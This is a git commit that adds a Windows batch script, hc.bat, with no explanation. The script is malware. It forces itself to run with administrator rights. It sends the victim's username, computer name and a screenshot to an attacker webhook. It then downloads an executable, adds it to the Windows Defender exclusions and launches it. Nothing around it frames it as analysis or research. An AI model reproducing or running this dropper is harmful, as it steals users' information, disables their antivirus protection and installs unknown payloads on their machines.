639c41782773c15dc4e4eed14a8a348b12442952
hoangkarin <104138722+hoangdevpython@users.noreply.github.com>
2023-12-02 19:02:48 +0700

    Add files via upload

---
+++ hc.bat
@@ -0,0 +1,9 @@
+@echo off
+net session >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%file%'" & exit /b 0)
+
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```new viticm %username% - %computer% download %url%```\"}"  %webhook%
+curl -i -H 'Expect: application/json' -F file=@%cd%\screenshot.png %webhook%
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.exe'"
+powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.exe'"
+start %temp%\file.exe
